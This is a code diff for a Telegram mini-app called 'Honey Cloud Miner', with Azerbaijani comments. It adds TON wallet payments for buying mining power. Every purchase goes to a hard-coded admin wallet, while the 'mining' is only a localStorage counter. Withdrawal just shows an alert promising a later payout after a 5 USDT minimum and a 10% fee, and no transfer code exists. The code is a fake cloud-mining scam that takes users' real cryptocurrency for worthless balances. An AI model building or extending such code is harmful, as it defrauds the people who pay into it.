@@ -154,12 +154,12 @@
 
     <!-- Yuxarı Menü -->
     <div class="top-bar">
-        <div style="font-size: 18px; cursor: pointer;" onclick="alert('Menü açılır...')">☰</div>
+        <div style="font-size: 18px; cursor: pointer;" onclick="alert('Honey Cloud Miner v1.0')">☰</div>
         <div class="balance-badge">
             <i class="fa-solid fa-circle-nodes usdt-icon"></i>
             <span id="usdt-balance">0.001109</span>
         </div>
-        <button class="plus-btn" onclick="alert('Depozit paneli açılır...')">+</button>
+        <button class="plus-btn" onclick="switchTab('guc')">+</button>
     </div>
 
     <!-- KAZICI TABI -->
@@ -178,7 +178,7 @@
             <div class="power-row">
                 <div>
                     <div style="color:#8a8d9b; font-size:12px;">Güç</div>
-                    <div style="font-size:18px; font-weight:bold;">2 000 GPU</div>
+                    <div style="font-size:18px; font-weight:bold;"><span id="gpu-power">2000</span> GPU</div>
                 </div>
             </div>
             <button class="btn-buy" onclick="switchTab('guc')">Mağazadan güç satın al</button>
@@ -194,13 +194,18 @@
         </div>
     </div>
 
-    <!-- GÜÇ TABI -->
+    <!-- GÜÇ TABI (HƏQİQİ DEPOZİT SİSTEMİ) -->
     <div id="tab-guc" class="tab-content">
-        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">⚡ Mağaza & Güç</h3>
+        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">⚡ Mağaza & Güç Satın Al</h3>
         <div class="card" style="text-align:center;">
             <h4>+1000 GPU Gücü</h4>
-            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 1.00 USDT</p>
-            <button class="btn-buy" onclick="buyPower(1000, 1.00)">Satın Al</button>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 0.2 TON (~1.00 USDT)</p>
+            <button class="btn-buy" onclick="buyPowerTON(0.2, 1000)">Cüzdanla Satın Al (TON)</button>
+        </div>
+        <div class="card" style="text-align:center;">
+            <h4>+5000 GPU Gücü (VIP)</h4>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 0.9 TON (~4.50 USDT)</p>
+            <button class="btn-buy" onclick="buyPowerTON(0.9, 5000)">Cüzdanla Satın Al (TON)</button>
         </div>
     </div>
 
@@ -208,18 +213,21 @@
     <div id="tab-kazan" class="tab-content">
         <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">👥 Kazan (Dəvət)</h3>
         <div class="card" style="text-align:center;">
-            <p style="font-size:13px; margin-bottom:10px;">Dostlarını dəvət et, GPU qazan!</p>
-            <button class="btn-buy" onclick="alert('Dəvət linki kopyalandı!')">Link Kopyala</button>
+            <p style="font-size:13px; margin-bottom:10px;">Dostlarını dəvət et, +200 GPU qazan!</p>
+            <button class="btn-buy" onclick="copyReferralLink()">Link Kopyala</button>
         </div>
     </div>
 
-    <!-- ÇEK TABI (TON Cüzdan Bağlantısı Burada Yerləşir) -->
+    <!-- ÇEK TABI -->
     <div id="tab-cek" class="tab-content">
-        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">💳 Balans Çıxarışı & Cüzdan</h3>
+        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">💳 Balans Çıxarışı</h3>
         <div class="card">
             <p style="color:#8a8d9b; font-size:12px; margin-bottom:8px; text-align:center;">Ödəniş almaq üçün TON Cüzdanınızı qoşun:</p>
-            <!-- TON Connect düyməsi üçün yer -->
             <div id="ton-connect-button"></div>
+            <div style="font-size:11px; color:#8a8d9b; margin-top:10px;">
+                * Minimum çıxarış: <b>5.00 USDT</b><br>
+                * Çıxarış komissiyası: <b>10%</b>
+            </div>
             <button class="btn-buy" style="margin-top:10px;" onclick="requestWithdrawal()">Çəkilmə Sorğusu Göndər</button>
         </div>
     </div>
@@ -261,16 +269,27 @@
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.expand(); }
 
+        // SİZİN ŞƏXSİ TON CÜZDAN ÜNVANINIZ
+        const ADMIN_WALLET = 'UQDkUQOUUt1ftSRRNkExQou9cVUhaWXusxBDNrNA9EUk5E9D';
+
         // TON Connect UI quraşdırılması
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://raw.githubusercontent.com/ton-connect/docs/main/demo-dapp/tonconnect-manifest.json',
+            manifestUrl: 'https://ypx498-creator.github.io/miner-app/tonconnect-manifest.json',
             buttonRootId: 'ton-connect-button'
         });
 
-        let hashes = 23.52282;
-        let usdtBalance = 0.001109;
+        tonConnectUI.uiOptions = {
+            actionsConfiguration: {
+                returnStrategy: 'https://t.me/Honeyfarmbot'
+            }
+        };
 
-        // Sayaçın donmaması üçün yaddaş mexanizmi
+        let hashes = parseFloat(localStorage.getItem('user_hashes')) || 23.52282;
+        let usdtBalance = parseFloat(localStorage.getItem('user_usdt')) || 0.001109;
+        let gpuPower = parseInt(localStorage.getItem('user_gpu')) || 2000;
+
+        document.getElementById('gpu-power').innerText = gpuPower;
+
         let startTime = localStorage.getItem('mining_start_time');
         if (!startTime) {
             startTime = new Date().getTime();
@@ -279,9 +298,12 @@
             startTime = parseInt(startTime);
         }
 
-        // Canlı Hash Artımı və Dayanmayan Real Vaxt Sayaçı
+        // Canlı Mining Hesablaması
         setInterval(() => {
-            hashes += 0.00012;
+            let speed = (gpuPower / 2000) * 0.00012;
+            hashes += speed;
+            localStorage.setItem('user_hashes', hashes);
+
             const el1 = document.getElementById('hash-count');
             const el2 = document.getElementById('mined-hashes');
             if(el1) el1.innerText = hashes.toFixed(5);
@@ -299,13 +321,44 @@
             }
         }, 1000);
 
+        // HƏQİQİ DEPOZİT ƏMƏLİYYATI (Sizin cüzdanınıza TON göndərilir)
+        async function buyPowerTON(amountInTon, addedGpu) {
+            if (!tonConnectUI.connected) {
+                alert("Ödəniş etmək üçün əvvəlcə 'Çek' tabından Cüzdanınızı qoşun!");
+                switchTab('cek');
+                return;
+            }
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 dəqiqə etibarlıdır
+                messages: [
+                    {
+                        address: ADMIN_WALLET, // Bütün ödənişlər SİZİN CÜZDANA gedir
+                        amount: (amountInTon * 1000000000).toString() // Nanoton çevrilməsi
+                    }
+                ]
+            };
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+                alert("Ödəniş uğurla tamamlandı! " + addedGpu + " GPU hesabınıza əlavə olundu.");
+                gpuPower += addedGpu;
+                localStorage.setItem('user_gpu', gpuPower);
+                document.getElementById('gpu-power').innerText = gpuPower;
+            } catch (e) {
+                alert("Ödəniş ləğv edildi və ya xəta baş verdi.");
+            }
+        }
+
         // Exchange Funksiyası
         function exchangeHashes() {
             if(hashes > 0.001) {
                 let converted = hashes * 0.0001;
                 usdtBalance += converted;
+                localStorage.setItem('user_usdt', usdtBalance);
                 alert(hashes.toFixed(5) + " Hash USDT-yə çevrildi!");
                 hashes = 0;
+                localStorage.setItem('user_hashes', 0);
                 document.getElementById('usdt-balance').innerText = usdtBalance.toFixed(6);
                 document.getElementById('hash-count').innerText = "0.00000";
                 document.getElementById('mined-hashes').innerText = "0.00000";
@@ -314,7 +367,23 @@
             }
         }
 
-        // Tab Keçidləri
+        // Çıxarış Sorğusu
+        function requestWithdrawal() {
+            if (!tonConnectUI.connected) {
+                alert("Zəhmət olmasa əvvəlcə TON Cüzdanınızı qoşun!");
+                return;
+            }
+            if (usdtBalance < 5.00) {
+                alert("Minimum çıxarış məbləği 5.00 USDT-dir! Balansınız yetərsizdir.");
+                return;
+            }
+            alert("Çıxarış sorğunuz qəbul edildi. Təsdiqləndikdən sonra 10% komissiya çıxılmaqla cüzdanınıza köçürüləcək.");
+        }
+
+        function copyReferralLink() {
+            alert('Dəvət linki kopyalandı! Dostlarınızı dəvət edərək +200 GPU qazanın.');
+        }
+
         function switchTab(tabName) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
@@ -324,26 +393,6 @@
 
             if(targetTab) targetTab.classList.add('active');
             if(targetNav) targetNav.classList.add('active');
-        }
-
-        function buyPower(amount, cost) {
-            if(usdtBalance >= cost) {
-                usdtBalance -= cost;
-                document.getElementById('usdt-balance').innerText = usdtBalance.toFixed(6);
-                alert(amount + " GPU gücü uğurla alındı!");
-            } else {
-                alert("Balansınızda kifayət qədər USDT yoxdur!");
-            }
-        }
-
-        function requestWithdrawal() {
-            // Cüzdanın qoşulub-qoşulmadığını yoxlayırıq
-            if (tonConnectUI.connected) {
-                const userAddress = tonConnectUI.wallet.account.address;
-                alert("Çıxarış sorğunuz qəbul olundu! Cüzdan: " + userAddress.substring(0, 6) + "...");
-            } else {
-                alert("Zəhmət olmasa əvvəlcə TON Cüzdanınızı qoşun!");
-            }
         }
     </script>
 </body>
